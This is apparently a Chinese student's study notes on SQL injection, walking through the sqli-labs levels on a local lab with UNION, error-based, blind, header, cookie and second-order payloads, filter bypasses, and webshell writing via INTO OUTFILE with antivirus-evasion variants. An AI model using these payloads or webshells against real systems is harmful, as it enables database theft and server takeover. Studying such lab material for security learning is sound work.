---
title: sql注入
published: 2025-05-23
description: 这是文章的简短描述
category: 信息安全
draft: false
---

#  SQL注入

### 原理

应用程序将用户输入（如表单、URL 参数）**直接字符串拼接**成 SQL 语句，未做分离与校验，使输入内容被数据库解析为**SQL 代码执行**，而非普通数据。

在用户输入时，web服务器只能判断输入是否合法，至于密码是否匹配要交给数据库，而sql时把用户输入的数据当作代码来执行

关键：Web应用把用户输入的内容带入到数据库中执行（可用预编译进行防御）。

### 预编译

本质时：把 **SQL 语句结构** 和 **用户输入数据** **完全分开**。

先把 SQL 模板发给数据库**编译定型**，后面只传参数值，**用户输入永远只会被当成普通数据，不会被当成 SQL 代码执行**，从根源杜绝 SQL 注入。

用**？**当作占位符，先写死SQL结构：SELECT * FROM users WHERE username = ?

**注意**：Python 里 `%s` 是占位符，**不是字符串格式化拼接**。

###  核心数据表

### 数据库（schema）-表名(table)-字段名(column)-数据

information_schema.tables(columns)表名和列名（WAF对此防御非常严格）

> table_schema 表所属的数据库名
>
> table_name：表名

information_schema.columns  所有字段（列）

> table_schema    字段所属的数据库名
>
> table_name       字段所属的表名
>
> column_name  字段名（核心字段）
>
> data_type          字段的数据类型（`varchar`/`int`等)

information_schema.views    记录 MySQL 中**所有视图**的信息

> table_schema     视图所属的数据库名
>
> table_name         视图名
>
> view_definition   视图的定义 SQL 语句

#### 常用函数

> `database()` / `schema()`      获取当前数据库名
>
> version()				  获取 MySQL 版本
>
> `user()` / current_user()       获取当前登录的数据库用户
>
> @@datadir			      获取 MySQL 数据存储路径
>
> @@basedir			     获取 MySQL 安装路径
>
> concat()			           拼接字符串（常用于多字段合并显示）
>
> group_concat()		      将多行结果拼接成一行（注入中必用！）

### 基本思路

1. 寻找注入点 
2. 有显示就UNION 
3. 有报错就报错 
4. 有区别就布尔 
5. 啥也没有用时间 
6. 时间不行上DNS

### 注入点的存在形式

1. URL参数（GET请求）
2. 表单输入框（POST请求）
3. HTTP Header
4. JSON/XML数据
5. 文件上传名（文件名为 ``a' or '1'='1.jp``）

### 不适合/不优先sql注入的场景

1. 纯静态页面		没有后端数据库
2. 页面完全由前端JS渲染          数据通过API 获取，可能没有 SQL
3. 已明确是 NoSQL 数据库（MongoDB等）

### 可能存在sql注入的提醒

You have an error in your SQL syntax...

### 基本流程

首先判断是否能够进行人机交互，数据可以提交到后台

1. 查找注入点

2. 判断参数是数字型还是字符型 and  1=1  或者 3-1

3. 如果是字符型，找到它的闭合方式（寻找报错），‘   “   ’）   ”）；如果是数字型，直接跳到第四条  **注意这里的符号用英文（不用英文还是显示页面，不报错）**<img src="./assets/image-20260429213322651.png" alt="image-20260429213322651" style="zoom:50%;" />

4. 判断查询列数，group by  数字    order by  数字（WAF防御较严格）

5. 查询回显位置  -1（第一行内容不显示）

   ![image-20260507162004132](./assets/image-20260507162004132.png)

6. **查当前库名**：`database()` → 得到 `security`

   > http://127.0.0.1/sqli-labs-php7-master/Less-1/?id=-2’ union select 1,version(),database()--+

   下面的可以看上面查询账户和密码的例子

   **查当前库的表名**：`table_name`（来自`information_schema.tables`）→ 得到 `users`

   **查`users`表的字段名**：`column_name`（来自`information_schema.columns`）→ 得到 `id,username,password`

   **查数据**：`select username,password from users` → 拿到账号密码

## 下面我用spli-labs进行相关漏洞的分析（前面是一些基本的补充知识，可以看后面的流程）

[SQL Injections](http://localhost/sqli-labs/)

### union联合注入

`UNION` 是 SQL 关键字，作用是**合并两个或多个 SELECT 语句的结果集**

它有两个==硬性要求==：

1.前后两个 `SELECT` 的**列数必须相同**      

2.对应列的**数据类型必须兼容**

LIMIT 偏移量 ，条数    `LIMIT 0,1`意思是从第0条数据开始，取一条数据

> ?id=0' union select 1,table_name,3 from information_schema.tables where table_schema=database()--+

这里是进行查询当前库的所有表名，这里可以用database()函数，如果直接写‘security’可能会直接被过滤

> http://home.ctfstu.com/sql/less-1/index.php?id=1' union select 1,2,3--+
>
> 这里页面只能显示第一条语句（UNION会把前后两个查询结果合并展示，但是页面会优先显示前面的内容）
>
> 可以http://home.ctfstu.com/sql/less-1/index.php?id=-1' union select 1,2,3--+
>
> 让前面的命令不能执行（可以讲前面的内容改为数据库不存在的数据），从而是后面的语句进行执行

![image-20260502152109991](./assets/image-20260502152109991.png)

这里是一个数字型（不用加单引号）。

至于要的数据在哪里显示，要看有没有==回显位==（回显位 = 页面上能把数据库查询结果 “显示出来” 的位置），这里图片中的Dhakkan就没有回显位，有回显位的位置是2和3.

==单引号的作用==：SELECT * FROM users WHERE id=' **1’（这里单引号提前闭合） union select 1,2,3（后面这一部分不再是字符串，而是构成了独立的sql语句）--+（讲后面的部分注释掉）** ' LIMIT 0,1;

判断参数是数字型还是字符型

### 参数判断的方法：12345可能不是数字型 **使用and 1=1来判断**

![image-20260507161422249](./assets/image-20260507161422249.png)

![image-20260507161431147](./assets/image-20260507161431147.png)

第一个是字符型 （ 实际上是“id =root and 1=2”,其中and不能当作指令来对待）依然显示，第二个是数字型不能执行

![image-20260429190122837](./assets/image-20260429190122837.png)

也可以用**数字的运算**来验证，如果是字符型不能进行运算，那么得到的界面是id=2；如果是数字型可以进行运算，得到的结果是id=1

### 查询列数的方法：group by 数字（通过尝试得出页面数据列数量）     order by有同样的效果

![image-20260507161608121](./assets/image-20260507161608121.png)

如果order 或者是group 成功了，会出现id=1的界面.

![image-20260507161616162](./assets/image-20260507161616162.png)

### 这里以查询users中的账户和密码为例（直接注入）

这里查询当前数据库的table_name(表名)，被限制了输出一个语句，可以用group_concat() (  将多行结果拼接成一行（注入中必用！）)

<img src="./assets/image-20260502145820541.png" alt="image-20260502145820541" style="zoom: 50%;" />

<img src="./assets/image-20260502150257989.png" alt="image-20260502150257989" style="zoom:50%;" />

![image-20260507163733569](./assets/image-20260507163733569.png)

![image-20260502151349906](./assets/image-20260502151349906.png)

### 下面是Less-3的源码，以此源码举例说明来补充基础知识

![image-20260507171143358](./assets/image-20260507171143358.png)

```php
 $id=$_GET['id'];  //直接接收参数，没有任何过滤
//SQL 拼接语句
    $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
//这里是一个字符型注入,它的闭合方式是')
// 执行 SQL
    $result=mysqli_query($con1, $sql);
    $row = mysqli_fetch_array($result, MYSQLI_BOTH);
if($row)
    {
        //有回显，输出username和password
        echo 'Your Login name:'. $row['username'];
        echo "<br>";
        echo 'Your Password:' .$row['password'];
    }
    else 
    {
        //打印数据库错误信息
        print_r(mysqli_error($con1));
    }
```

## 基本流程

1.有回显：直接注入

2.无回显：有报错信息：报错注入

3.无回显：无报错信息：盲注（布尔注入与时间注入），根据是否有不同的页面

关于注释的话可以使用-- a(a前面有一个空格)或-- +（+前面有一个空格）（POST传参时可能会失效），#



### Less-1：字符型

### Less-2：数字型

### Less-3：闭合方式是‘)

### Less-4：闭合方式是”

```php
$id = '"' . $id . '"';   //这里注意id的命名方式
```

### Less-5：无回显联合查询**，**只能用报错注入

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";//这里是'字符型
```

页面不输出查询数据，只有正确 / 错误两种页面，**不能用 Union 回显**

依靠**MySQL 报错信息**爆出数据

updatexml报错**最多显示 32 位字符**，长数据要截取

![image-20260507192758756](./assets/image-20260507192758756.png)

#### 下面是updatexml / extractvalue 报错注入原理

这两个函数在MySQL中用于XML操作，当传入的XPath表达式**格式错误**时，会抛出错误信息并**将参数内容显示出来**

```sql
updatexml(xml_target（目标xml内容）, xpath_expr（xml文档路径）, new_value（更新的内容）)
extractvalue(xml_target（目标xml内容）, xpath_expr（xml文档的路径）)
```

一般情况下，xpath_expr 应该是类似 `/root/node` 这样的路径

```sql
select updatexml(1, '~test', 1);
#当 xpath_expr 中包含 ~、!、#,@,$,:,],[ 等非法XPath字符，MySQL会报错并显示你的输入
```

利用注入原理

```sql
-- 把 ~test 替换成一个能查询数据的子查询，就可以通过报错信息"带出"数据。
select updatexml(1, concat('~', database()), 1);
#这里的concat是sql拼接语句
-- 报错: XPATH syntax error: '~数据库名'
```

#####  注入限制与绕过

1.结果长度限制

```sql
#报错信息最多显示32字符，超时会被截断
-- 如果数据很长，只显示前32位
select updatexml(1, concat('~', (select group_concat(table_name) from information_schema.tables where table_schema=database()), 1);
```

可以用substr()分段提取

```sql
select updatexml(1, concat('~', substr((查询语句), 1, 31)), 1);
#取1-31位
```

2.只能返回一条数据

如果子查询返回多行，会报 `Subquery returns more than 1 row`。

可以使用 `limit 0,1` （返回的是一行数据）逐条拿，或用 `group_concat()` → 但注意长度限制。

这里extractvalue 与 updatexml 的区别：

| 函数         | 报错方式                       | 典型 payload                           |
| ------------ | ------------------------------ | -------------------------------------- |
| extractvalue | 只读，不修改数据               | `extractvalue(1, concat('~', (查询)))` |
| updatexml    | 会尝试修改，但报错发生在解析时 | `updatexml(1, concat('~', (查询)), 1)` |

```sql
-- 1. 拿数据库名
' and extractvalue(1, concat('~', database())) --+
-- 2. 拿表名（分段）
' and extractvalue(1, concat('~', substr((select group_concat(table_name) from information_schema.tables where table_schema='you_db'), 1, 31))) --+

-- 3. 拿字段名
' and extractvalue(1, concat('~', substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'), 1, 31))) --+

-- 4. 拿数据
' and extractvalue(1, concat('~', substr((select group_concat(username, ':', password) from you_db.users), 1, 31))) --+
#这里最后的you_db.users不能写成database().users   此处的.是用来分隔数据库和表名的，不是用来调用的
```

### Less-6：闭合方式是“   ,其他的和Less-5没有区别

### Less-7：这里遇到了一个问题，闭合方式怎么确定

```sql
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
#这里的闭合方式是'))
#但是在注入是我用/?id=2'和/?id=2')  ，/?id=2'))都报错
#?id=2'))--+可以在后面进行省略来判断前面的闭合方式
#要是显示正常的页面，那么'))是正确的，如果报错，就是错误的
```

这里可以尝试用报错注入漏洞，但是Less-7这个关卡是主要是专门用来练习**文件读写（`Into Outfile`）**的关卡。

into outfile 写文件注入

利用 MySQL 导出数据到网站目录，**写一句话木马**

权限要求：MySQL 有**写文件权限**、知道网站绝对路径

注意：

闭合必须用：`')`

靶场必须**开启 MySQL 导出权限**

要知道网站物理路径，否则写不进目录

防火墙、权限不足会直接失败

#### 下面是into outfile()写文件注入的补充知识点

`INTO OUTFILE` 是 MySQL 中用于将查询结果导出到文件的函数

```sql
SELECT * FROM users INTO OUTFILE '/tmp/result.txt';
SELECT '<?php phpinfo();?>' INTO OUTFILE '/var/www/html/shell.php';
```

利用条件

> 1. 文件有写入权限，MySQL 用户有 `FILE` 权限
> 2. 知道绝对路径
> 3. 目标目录可写（目标目录有写入权限）

配置检查

1.检查secure_file_priv

```sql
-- 查看限制
SHOW VARIABLES LIKE "secure_file_priv";#secure_file_priv是文件读写权限
-- NULL：禁止导出
-- 空值：无限制（最好）
-- /path/：只能导出到指定目录
```

2.检查FILE权限（FILE是MYSQL中的一种全局权限，它授予用户文件导入导出和文件读取权限）

```sql
-- 查看当前用户权限
SELECT * FROM mysql.user WHERE user=user();
-- 或
SELECT file_priv FROM mysql.user WHERE user='root';
```

基础注入流程

1.判断注入点并获取绝对路径

```
-- 通过报错获取路径
?id=1' and updatexml(1,concat(0x7e,@@basedir),1)--+  #@@datadir	获取 MySQL 数据存储路径

?id=1' and updatexml(1,concat(0x7e,@@datadir),1)--+  #@@basedir	获取 MySQL 安装路径

-- 通过 load_file 读取配置文件
?id=1' and 1=2 union select 1,load_file('C:/xampp/apache/conf/httpd.conf'),3--+
?id=1' and 1=2 union select 1,load_file('/etc/apache2/apache2.conf'),3--+
```

LOAD_FILE():是 MySQL 中用于**读取服务器文件**的函数，在 SQL 注入中常被用来**读取敏感文件**。

load_file()使用的前提条件：

> secure_file_priv 不为 NULL
>
> 文件可读
>
> 文件大小必须小于max_allowed_packet的限制



2.写入 Webshell

```
-- 基础写法
?id=1' union select 1,2,"<?php @eval($_POST['cmd']);?>" INTO OUTFILE '/var/www/html/shell.php'--+

-- 十六进制绕过（避免引号转义）
?id=1' union select 1,2,0x3c3f70687020406576616c28245f504f53545b22636d64225d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--+

-- 使用 lines terminated by（绕过WAF）
?id=1' union select 1,2,3 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e--+
```

INTO OUTFILE（标准写法）

> SELECT 'webshell内容' INTO OUTFILE '路径/文件名.php';



3.写入一句话木马

```
// PHP 一句话木马
<?php @eval($_POST['cmd']);?>

// 更复杂的一句话（绕过检测）
<?php $a='as'.'sert';$a($_POST['x']);?>

// 使用 hex 编码
<?php eval(base64_decode('cGhwaW5mbygpOw=='));?>
```

一句话木马是 Webshell 中最精简、最经典的形态，通过**极短的代码**实现**强大的远程控制能力**。

只有一行代码的恶意脚本，接收远程参数并动态执行。

一句话木马可以有多种语言，也可以有连接多种工具，可以先以php代码为例进行学习，了解它的基本语法和危险函数以及过滤与绕过

### 场景：sqli-labs Less-7（文件写入）

```
# 1. 检查是否可写
http://127.0.0.1/sqli-labs-php7-master/Less-7/?id=1')) into outfile "/tmp/test.txt" --+

# 2. 获取绝对路径（通过报错）
http://127.0.0.1/sqli-labs-php7-master/Less-7/?id=1')) and extractvalue(1,concat(0x7e,@@basedir)) --+

# 3. 写入 webshell
http://127.0.0.1/sqli-labs-php7-master/Less-7/?id=1')) union select 1,2,'<?php @eval($_POST[cmd]);?>' into outfile "E:/phpstudy_pro/WWW/te.php"--+    #这里你要注意要写在phpstudy的根目录里，浏览器只能访问到根目录的东西

# 4. 连接 webshell
# POST 请求：http://127.0.0.1/te.php
# 参数：cmd=system('whoami');
#直接写在地址栏 http://127.0.0.1/te.php?cmd=... 是没用的，因为 PHP 收不到 $_POST 数据。
#浏览器默认发送的是GET请求，而后门代码写的是$_POST['cmd'],只接受POST数据
```

![image-20260508173243784](./assets/image-20260508173243784.png)



这里如果你的电脑端下载了火绒的话，会直接被拦截掉。

![image-20260508172535962](./assets/image-20260508172535962.png)

这里你可以尝试用assert（试过了不行），字符串拼接绕过特征检测（成功了），使用异或或取反等更复杂的免杀手段。

```php
<?php $a=$_POST['c'];$b='md';$c='eval';$c($a); ?>
```

### Less-8:闭合方式是‘

这里要用到布尔盲注（页面**没有报错信息、没有数据显示位**时，只能通过页面返回的**True/False 差异**来逐字符获取数据。）

#### 布尔盲注

构造一个条件判断语句，根据页面返回的**不同表现**来推断数据。

适用场景

> - 页面没有回显位（Union注入无效）
> - 没有报错信息（报错注入无效）
> - 但页面真/假又明显差异

核心函数

| 函数                  | 作用                         | 示例                                  |
| --------------------- | ---------------------------- | ------------------------------------- |
| length(str)           | 返回字符串长度               | `length(database()) > 5`              |
| substr(str, n, 1)     | 截取字符串，从第n位取1个字符 | `substr(database(), 1, 1) = 's'`      |
| ascii(char)           | 返回字符的ASCII码            | `ascii(substr(database(),1,1)) = 115` |
| ord(char)             | 同上（MySQL）                | `ord(substr(database(),1,1)) = 115`   |
| if(cond, true, false) | 条件判断                     | `if(1=1, sleep(5), 0)`                |

```php
-- 长度
' or length(database()) = 8 --+

-- 第1位
' or ascii(substr(database(),1,1)) = 115 --+  -- 's'

-- 第2位(可以使用and，但是要确认amdin这个用户存在)
admin' and ascii(substr(database(),2,1)) = 101 --+  -- 'e'
```

这里手工猜数据库名，数据表名极慢，可以用二分查找，批量读取，位运算，多线程（我没有尝试过，这里给个思路，便于以后遇到这类问题求解）

### Less-9：这里的闭合方式是‘（我是看源码得到的，不是通过报错得到的）

这里的if和else输出一样，没有区别，都是You are in...........

这里Less-8是布尔盲注，判断方法是看页面有无内容

Less-9是时间盲注，判断方法是看响应时间

```php
if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysqli_error($con1));
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
```

#### 时间盲注

**没有任何回显差异**（既无数据显示，也无报错信息，真/假页面完全一样）时，只能通过**时间延迟**来推断数据。

造条件判断，如果条件为真就执行延时函数（如 `sleep()`），通过观察页面**响应时间**来推断数据。

适应场景

> - 页面没有显示位（Union 注入无效）
> - 没有报错信息（报错注入无效）
> - 真/假页面**完全一样**（布尔盲注无效）
> - 但能执行 `sleep()` 等延时函数

核心函数

| 函数                                      | 作用                     | 示例                                     |
| ----------------------------------------- | ------------------------ | ---------------------------------------- |
| `sleep(n)`                                | 延迟 n 秒                | `sleep(5)`                               |
| `benchmark(count, expr)`                  | 重复执行表达式，消耗时间 | `benchmark(10000000, md5('a'))`          |
| `if(cond, true, false)`                   | 条件判断                 | `if(1=1, sleep(5), 0)`                   |
| `case when cond then sleep(5) else 0 end` | 条件判断                 | `case when 1=1 then sleep(5) else 0 end` |



```php
#Less-9的流程
-- 判断数据库长度是否大于 5（如果大于5，延时5秒）
http://127.0.0.1/sqli-labs-php7-master/Less-9/?id=1' and if(length(database())>5, sleep(5), 0) --+
#之后再利用二分查找定位长度
-- 获取第一个表的长度
http://127.0.0.1/sqli-labs-php7-master/Less-9/?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5, sleep(5), 0) --+

-- 获取第一个表的第1个字符
http://127.0.0.1/sqli-labs-php7-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100, sleep(5), 0) --+
#之后的做法和Less-8的做法类似，用用ascii()来查询字符，进而获取想要 数据
```

> ‘or  if(length(database())>5, sleep(5), 0) #  这个表达式

这里用or的话，后面if()条件为真时先执行sleep(5),然后返回0，只是这里的username=‘’ or 0为假，可以改为1（但是我在Less-15中一直显示加载页面）

### Less-10：这里的做法和Less-9一样，只是闭合方式改成了“

### Less-11：登入框POST注入（单引号类型）

```php
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

#### POST注入

POST 注入是 SQL 注入中非常常见的场景，主要出现在**登录框、搜索框、表单提交**等地方。与 GET 注入的区别在于，参数是通过 **HTTP 请求体** 传递的，而不是 URL。

这里的万能密码‘or 1=1 #可以用，但是’or 1=1 --+不能用,在POST请求中+不会被解码位空格，而是作为字面量+发送，可能失效。

```php
#尝试万能密码
'or 1=1 #
#判断字段数
'or 1=1 order by 2 #
#判断回显位
'union select 1,database() #
#判断数据库名
'union select 1,database() #
#判断表名: 
'union select 1,table_name from information_schema.tables where table_schema='security' #
#判断列名: 
'union select 1,column_name from information_schema.columns where table_schema='security' and table_name='emails' #
#判断数据: 
'union select 1,id from emails #
```

核心

> - **POST 无 URL 参数**，抓包在表单里注入
> - 登录框双字段 `username/password` 都可注入
> - 适合联合查询、报错注入

注意

> - 不能直接改 URL，需要 **Burp 抓包** 或页面输入框直接输 Payload
> - 输入框直接填：`admin' #` 可绕过登录

这里和Less-1的原理一样，只是从GET变成了POST登入框注入

### Less-12：这里和Less-11一样，只是变成了“)闭合

### Less-13：闭合方式‘)  盲注/报错注入

无回显

### Less-14：闭合方式“    盲注/报错注入

这一题和Less-13一样，只是闭合方式变成了”

### Less-15：闭合方式是‘     盲注（时间和布尔）

```php
#php的这行代码表示滚逼了报错信息，不能进行报错注入
error_reporting(0);
#但是仅是代表php不能报错，不代表mysql不报错，这里没有print_r(mysqli_error($con1));不能显示mysql报错信息
```

```php
#先印证闭合方式，寻找一个可能存在的id名
'or 1=1 #
#再进行盲注
' or length(database())>5 #
```

### Less-16:闭合方式是“)   盲注（时间和布尔）

这一题和Less-15思路一样，只是闭合方式改为“)

### Less-17:密码重置框：闭合方式是‘ 报错注入

这一题你必须知道至少一个正确的用户名（要不你没法在密码框中注入）

### Less-18：HTTP头部注入（User-Agent注入）

这里在Less-23找到了name=***\*Angelina\****,password=0;

User-Agent：告诉服务器“**我是谁**”（用什么设备/浏览器访问）。

```php
function check_input($con1, $value)
{
    if(!empty($value))
    {
        $value = substr($value,0,20);      // 截断到20字符
    }
    
    if (get_magic_quotes_gpc())
    {
        $value = stripslashes($value);     // 去掉转义斜杠
    }
    
    if (!ctype_digit($value))               // 如果不是纯数字
    {
        $value = "'" . mysqli_real_escape_string($con1, $value) . "'";
    }
    else
    {
        $value = intval($value);
    }
    return $value;
}
```

这一题有严密的防御机制：截断到20字符，去转义，转义字符（将单引号转成\'）,加外层引号。

这里是的uname和passwd无法注入，因为引号被转义了。

但是这里$uagent没有任何人过滤

```php
$uagent = $_SERVER['HTTP_USER_AGENT'];
```

```php
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

由于 `$uagent` 是直接拼接进 SQL 语句的，且没有经过任何过滤，这就产生了一个完美的**单引号闭合的 INSERT 型注入点**。

```php
echo 'Your User Agent is: ' .$uagent;
echo "<br>";
print_r(mysqli_error($con1));
```

这构成了**报错注入（Error-based Injection）**的条件。只要你在 `User-Agent` 中构造的 Payload 触发了 MySQL 报错，报错信息就会直接显示在页面上。

这一关是绕过前端表单的防御，在 HTTP 请求头中寻找突破口。

![image-20260509152123342](./assets/image-20260509152123342.png)

这里思路是对的，可是我拿BurpSuit抓到包后修改包后还是不能显示报错信息，我觉得是我的用户名和密码不正确（只是猜测）

>  这里的' and extractvalue(1, concat(0x7e, database(), 0x7e)) and '也可以写成' and extractvalue(1, concat(0x7e, database(), 0x7e)) ,1,1) # 主要是补全后面有的\$IP和\$uname

### Less-19:HTTP请求头注入（Referer字段注入）

Referer：告诉服务器“**我从哪里来**”（是从哪个链接跳转过来的）。

```php
$uagent = $_SERVER['HTTP_REFERER']; // 注意：变量名可能叫 $uagent，但其值来源于 HTTP_REFERER
$IP = $_SERVER['REMOTE_ADDR'];
```

这里直接将 HTTP 请求头中的 `Referer` 字段的值赋给了一个变量，并且**完全没有进行任何安全过滤**。

```php
$insert = "INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
mysqli_query($con1, $insert);
```

由于 `$uagent`（其值来自 `Referer`）被直接拼接进了 SQL 语句，这就构成了一个典型的 **INSERT 型注入点**。

```php
print_r(mysqli_error($con1))#这里可以用报错注入
```

```php
--查数据库
' and updatexml(1, concat(0x7e, database(), 0x7e), 1) and '
-- 查表名
' and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e), 1) and '
-- 先查用户名
' and updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1) and '
-- 再查对应的密码
' and updatexml(1, concat(0x7e, (select password from users where username='Dumb'), 0x7e), 1) and '
```

### Less-20:**“Cookie Injection - Error Based”**（基于错误的 Cookie 注入）

```php
else {
    //漏洞点:直接从 Cookie 获取 uname，没有任何过滤！
    $cookee = $_COOKIE['uname']; 
    //拼接:直接拼接到 SQL 语句中，且用单引号包裹
    $sql = "SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
    $result = mysqli_query($con1, $sql);
    $row = mysqli_fetch_array($result, MYSQLI_BOTH);
    if($row) {
        // 显示用户信息
        echo "Your Login name: " . $row['username'];
    } else {
        //报错回显:打印 MySQL 错误信息
        print_r(mysqli_error($con1));
    }
```

闭合方式是‘       报错注入

1. 获取正常 Cookie（在浏览器中输入账号 `admin` 和密码 `admin` 登录。登录成功后，页面会显示 "You are logged in"。此时浏览器已经存入了 `uname=admin` 的 Cookie。）

2. 抓包并修改（刷新页面，使用 Burp Suite 拦截请求）

3. Payload 构造

   ```php
   #and写法
   admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
   #or写法
   ' or updatexml(1,concat(0x7e,database()),1) or '
   ```

### Less-21：Cookie注入和Base64编码

```php
#服务器在设置 uname Cookie 时，使用了 base64_encode() 函数。
setcookie('uname', base64_encode($row1['username']), time()+3600);
#获取 Base64 编码的字符串
$cookee = $_COOKIE['uname']; 
#先进行 Base64 解码
$cookee = base64_decode($cookee); 
#直接拼接
$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
$result=mysqli_query($con1, $sql);
```

1. 获取Cookie
2. 进行Base64解码
3. Payload构造用Base64编码，替换Cookie

这里的#和--+可能有编码问题可以改写成admin'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '1'='1    将后面的’闭合掉

### Less-22：Cookie 注入，**Base64 + 双引号**

方法和Less-21一样，只是闭合方式改成“

### Less-23:**注释符过滤的绕过**

```php
#过滤了#,--
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
```

既然无法注释掉后面的内容，那就**手动构造完整的闭合**。

```php
#手动闭合
?id=-1' union select 1,2,3 or '1'='1
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' or '1'='1
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' or '1'='1
?id=-1' union select 1,group_concat(username,':',password),3 from users or '1'='1
```

此处不能用order by 数字（因为`ORDER BY` 子句必须放在整个 `SELECT` 语句的**最后面**，而此时最后面是‘1’=‘1）

### Less-24:二次注入（存储型注入）

- **前面的关卡（一次注入）**：你直接把恶意代码发给服务器，服务器当场就执行了。
- **Less-24（二次注入）**：你先把恶意代码“存”进数据库里，等服务器**自己**读取并信任了这份数据，它才会在你设定的另一个地方引爆。
  1. **存储**：将恶意的 SQL 片段（如 `admin'#`）作为用户名**存储**到数据库中。此时因为转义处理，不会报错。
  2. **触发**：当你使用这个恶意用户名进行后续操作（如修改密码）时，程序从数据库取出该用户名并拼接到新的 SQL 语句中，此时恶意代码被执行。

靶场里已经有个叫 `admin` 的用户，你的目标是不用知道他的原密码，直接改掉它。

1. 注册

   ```php
   // 插入数据时使用了双引号包裹，并对输入进行了转义
   $sql = "insert into users (username, password) values(\"$username\", \"$pass\")";
   ```

2. 修改密码

   ```php
   $username = $_SESSION["username"]; // 从 Session 获取用户名（即你注册时的恶意用户名）
   $curr_pass = mysqli_real_escape_string($con1, $_POST['current_password']);
   $pass = mysqli_real_escape_string($con1, $_POST['password']);
   
   //漏洞点:直接拼接 $username，没有再次过滤！
   $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
   ```

   这里的mysqli_real_escape_string:它的作用是**根据当前数据库连接的字符集，对字符串中的特殊字符进行转义**（添加反斜杠），使其可以安全地拼接到 SQL 语句中。

   现在用预处理语句（这个会在笔记最前面进行补充）

   1. 先用admin’ #进行注册（存储环节）这里的闭合方式可以是用test’123进行实验，如果成功，则闭合方式是‘  ，此时用test”123就会报错，反之test’123会报错
   2. 修改admin’ #的密码（触发）
   3. 此时就可以用admin’ #的密码登入admin的账户了

### Less-25：闭合方式‘   **关键字过滤与绕过(OR&AND)**

这里用-- a作为注释，#可能被浏览器当作注释将后面的内容抛弃（包括#本身）

```php
#测试字段数（oorrder绕过）
http://127.0.0.1/sqli-labs-php7-master/Less-25/?id=1' oorrder by 3 -- a
http://127.0.0.1/sqli-labs-php7-master/Less-25/?id=-1' union select 1, database(), 3 -- a
#也可以用手动闭合的方式，记得（anandd）
http://127.0.0.1/sqli-labs-php7-master/Less-25/?id=-1' union select 1, database(), 3 anandd '1'='1
```

### Less-26:

```php
function blacklist($id)
{
    $id = preg_replace('/or/i', '', $id);   // 移除 or (不区分大小写)
    $id = preg_replace('/and/i', '', $id);  // 移除 and (不区分大小写)
    $id = preg_replace('/[\/\*]/', '', $id);// 移除 /*
    $id = preg_replace('/[--]/', '', $id);  // 移除 --
    $id = preg_replace('/[#]/', '', $id);   // 移除 #
    $id = preg_replace('/[\s]/', '', $id);  // 【关键】移除所有空白字符（空格、换行等）
    return $id;
}
```

这里逻辑词没了，注释没了，空格没了

绕过空格

> 虽然普通空格被过滤了，但 MySQL 支持多种空白字符来分隔关键字。在 URL 中，我们可以利用以下编码：
>
> - **`%0a`**：换行符 (New Line) —— **最常用**
> - **`%0b`**：垂直制表符 (Vertical Tab)
> - **`%0c`**：换页符 (Form Feed)
> - **`%0d`**：回车符 (Carriage Return)
> - **`%20`**：普通空格（会被过滤，不能用）
> - **`%a0`**：特殊空格（在某些环境下可用）
> - **示例**：`UNION SELECT` -> `UNION%0aSELECT`

绕过AND/OR——双写与符号

> - **双写绕过**：
>   - `and` -> `anandd` (程序删掉中间的 `and`，剩下 `and`)
>   - `or` -> `oorr` (程序删掉中间的 `or`，剩下 `or`)
> - **符号替代**（更简单）：
>   - `AND` -> `&&`
>   - `OR` -> `||`

绕过注释

手动闭合:AND '1'='1

```php
#查数据库
http://127.0.0.1/sqli-labs-php7-master/Less-26/?id=1%27||updatexml(1,concat(0x7e,database()),1)||%271%27=%271
#查表名
http://127.0.0.1/sqli-labs-php7-master/Less-26/?id=1%27||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=%27security%27))),1)||%271%27=%271
#剩下的和之前一样
```

可以尝试使用&&，但是浏览器会将&&解析成参数分隔符，则可以使用%26%26(URL编码)

### Less-27：闭合方式‘    过滤union,select,空格

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
